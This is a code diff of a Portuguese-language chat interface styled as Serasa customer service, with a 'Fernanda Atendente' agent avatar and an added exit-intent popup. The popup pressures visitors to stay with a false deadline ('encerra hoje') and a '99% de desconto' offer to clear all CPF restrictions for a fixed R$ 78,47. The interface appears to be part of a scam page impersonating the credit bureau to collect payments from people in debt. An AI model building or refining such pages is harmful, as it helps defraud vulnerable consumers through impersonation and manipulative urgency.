+                          </div>
+                        ))}
+                      {message.buttons.some((button) => {
                         const buttonId = `${button.action}-${button.text}`
                         return !clickedButtons.has(buttonId)
-                      })
-                      .map((button, index) => (
-                        <div
-                          key={index}
-                          onClick={() => handleButtonClick(button.action, button.text)}
-                          className="bg-pink-600 hover:bg-pink-700 text-white rounded-xl px-6 py-4 cursor-pointer shadow-lg hover:shadow-xl transition-all duration-200 text-sm font-semibold border-0"
-                        >
-                          {button.text}
-                        </div>
-                      ))}
-                    {message.buttons.some((button) => {
-                      const buttonId = `${button.action}-${button.text}`
-                      return !clickedButtons.has(buttonId)
-                    }) && <div className="text-xs text-gray-400 text-right mt-1">Toque para enviar</div>}
+                      }) && <div className="text-xs text-gray-400 text-right mt-1">Toque para responder</div>}
+                    </div>
+                  </div>
+                )}
+              </div>
+            ))}
+
+            {isTyping && (
+              <div className="flex justify-start mb-2">
+                <div className="flex items-end gap-2">
+                  <div className="w-8 h-8 rounded-full overflow-hidden flex-shrink-0 bg-pink-600 border border-pink-200 shadow-xs">
+                    <Image
+                      src={isFernandaJoined ? "/fernanda-avatar.jpg" : "/serasa-avatar.png"}
+                      alt={isFernandaJoined ? "Fernanda Atendente" : "Serasa"}
+                      width={32}
+                      height={32}
+                      className="w-full h-full rounded-full object-cover"
+                    />
+                  </div>
+                  <div className="bg-gray-100 border border-gray-200 rounded-2xl rounded-bl-sm px-3.5 py-2 shadow-sm flex items-center space-x-1.5 h-8">
+                    <div className="w-1.5 h-1.5 bg-[#e6007e] rounded-full animate-bounce" style={{ animationDuration: "0.8s" }}></div>
+                    <div
+                      className="w-1.5 h-1.5 bg-[#e6007e] rounded-full animate-bounce"
+                      style={{ animationDuration: "0.8s", animationDelay: "0.15s" }}
+                    ></div>
+                    <div
+                      className="w-1.5 h-1.5 bg-[#e6007e] rounded-full animate-bounce"
+                      style={{ animationDuration: "0.8s", animationDelay: "0.3s" }}
+                    ></div>
                   </div>
                 </div>
-              )}
-            </div>
-          ))}
-
-          {isTyping && (
-            <div className="flex justify-start mb-2">
-              <div className="flex items-end gap-2">
-                <div className="w-8 h-8 rounded-full overflow-hidden flex-shrink-0 bg-pink-600">
-                  <Image
-                    src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/unnamed-mc1cq9oGl94BkoUSXsitt93EG7m1IA.png"
-                    alt="Serasa"
-                    width={32}
-                    height={32}
-                    className="w-8 h-8 rounded-full object-cover"
-                  />
-                </div>
-                <div className="bg-gray-100 border border-gray-200/90 rounded-2xl rounded-bl-sm px-3.5 py-2 shadow-sm flex items-center space-x-1.5 h-8">
-                  <div className="w-1.5 h-1.5 bg-[#e6007e] rounded-full animate-bounce" style={{ animationDuration: "0.8s" }}></div>
-                  <div
-                    className="w-1.5 h-1.5 bg-[#e6007e] rounded-full animate-bounce"
-                    style={{ animationDuration: "0.8s", animationDelay: "0.15s" }}
-                  ></div>
-                  <div
-                    className="w-1.5 h-1.5 bg-[#e6007e] rounded-full animate-bounce"
-                    style={{ animationDuration: "0.8s", animationDelay: "0.3s" }}
-                  ></div>
-                </div>
               </div>
-            </div>
-          )}
+            )}
 
             <div ref={messagesEndRef} className="h-6 w-full" />
           </div>
         </div>
       </main>
+
+      {/* Exit Intent Modal */}
+      {showExitModal && (
+        <div className="fixed inset-0 bg-black/60 z-50 flex items-center justify-center p-4 backdrop-blur-xs">
+          <div className="bg-white rounded-2xl max-w-sm w-full p-5 text-center shadow-2xl animate-in fade-in zoom-in-95 duration-200">
+            <div className="w-12 h-12 rounded-full bg-pink-100 text-pink-600 mx-auto flex items-center justify-center mb-3">
+              <ShieldCheck className="w-7 h-7" />
+            </div>
+            <h3 className="font-bold text-gray-900 text-lg leading-tight mb-1.5">
+              Espere! Não perca seu acordo com 99% de desconto
+            </h3>
+            <p className="text-xs text-gray-600 mb-4 leading-relaxed">
+              O Feirão Serasa Limpa Nome encerra hoje. Você pode retirar todas as restrições do seu CPF por apenas R$ 78,47!
+            </p>
+            <div className="space-y-2">
+              <button
+                onClick={() => setShowExitModal(false)}
+                className="w-full bg-pink-600 hover:bg-pink-700 text-white font-bold py-3 rounded-xl text-sm transition-all shadow-md"
+              >
+                Continuar Atendimento
+              </button>
+              <button
+                onClick={() => setShowExitModal(false)}
+                className="w-full text-xs text-gray-400 hover:text-gray-600 py-1"
+              >
+                Fechar
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   )
 }
